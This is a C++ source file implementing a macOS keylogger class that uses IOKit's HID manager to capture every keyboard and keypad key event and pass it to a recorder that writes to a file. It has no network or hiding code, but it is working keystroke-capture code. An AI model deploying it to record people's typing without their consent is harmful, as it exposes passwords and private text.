#include "keylogger.hpp"

#include <IOKit/hid/IOHIDManager.h>

#include <cassert>

#include "recorder.hpp"

Keylogger::Keylogger(const std::string& out_path, bool record_virtual) : recorder_(out_path, record_virtual) {}

CFMutableDictionaryRef Keylogger::CreateMatchingCriteria(std::unordered_map<const char*, int> criteria) {
  CFMutableDictionaryRef dictionary = CFDictionaryCreateMutable(
      kCFAllocatorDefault,
      0,
      &kCFTypeDictionaryKeyCallBacks,
      &kCFTypeDictionaryValueCallBacks);
  if (!dictionary) {
    return nullptr;
  }

  for (const auto& [key, value] : criteria) {
    CFStringRef key_ref = CFStringCreateWithCString(
        kCFAllocatorDefault, key, kCFStringEncodingASCII);
    CFNumberRef value_ref = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &value);

    CFDictionarySetValue(dictionary, key_ref, value_ref);

    CFRelease(key_ref);
    CFRelease(value_ref);
  }

  return dictionary;
}


void Keylogger::Run() {
  // Create an HID manager object to read input events from HID devices.
  IOHIDManagerRef hid_manager = IOHIDManagerCreate(
      kCFAllocatorDefault, kIOHIDManagerOptionNone);

  // Create a set of matching criteria to only receive HID reports from
  // keyboard and keypad devices.
  {
    CFMutableDictionaryRef keyboard_criteria = CreateMatchingCriteria({
        { kIOHIDDeviceUsagePageKey, kHIDPage_GenericDesktop },
        { kIOHIDDeviceUsageKey, kHIDUsage_GD_Keyboard } });
    assert(keyboard_criteria != nullptr);

    CFMutableDictionaryRef keypad_criteria = CreateMatchingCriteria({
        { kIOHIDDeviceUsagePageKey, kHIDPage_GenericDesktop },
        { kIOHIDDeviceUsageKey, kHIDUsage_GD_Keypad } });
    assert(keypad_criteria != nullptr);

    CFDictionaryRef device_criteria_all[] = { keyboard_criteria, keypad_criteria };

    CFArrayRef device_criteria = CFArrayCreate(
        kCFAllocatorDefault,
        (const void**) device_criteria_all,
        CFDictionaryGetCount(*device_criteria_all),
        nullptr);
    assert(device_criteria != nullptr);

    IOHIDManagerSetDeviceMatchingMultiple(hid_manager, device_criteria);
    CFRelease(device_criteria);
    CFRelease(keypad_criteria);
    CFRelease(keyboard_criteria);
  }

  // Create a min and max HID scan code to only receive relevant keyboard data.
  // USB HID keyboard/keypad usage IDs below 0x04 don't represent physical key
  // presses, and IDs above 0xe7 are reserved, as specified in version 1.21 of
  // the HID Usage Tables.
  {
    CFMutableDictionaryRef value_criteria = CreateMatchingCriteria({
        { kIOHIDElementUsageMinKey, 0x4 },
        { kIOHIDElementUsageMaxKey, 0xe7 } });
    assert(value_criteria != nullptr);

    IOHIDManagerSetInputValueMatching(hid_manager, value_criteria);
    CFRelease(value_criteria);
  }

  IOHIDManagerRegisterInputValueCallback(hid_manager, &Recorder::HIDKeyboardCallback, &recorder_);

  IOHIDManagerScheduleWithRunLoop(hid_manager, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);

  IOReturn open = IOHIDManagerOpen(hid_manager, kIOHIDOptionsTypeNone);
  assert(open == kIOReturnSuccess);

  CFRunLoopRun();

  CFRelease(hid_manager);
}

void Keylogger::Stop() {
  CFRunLoopStop(CFRunLoopGetCurrent());
}
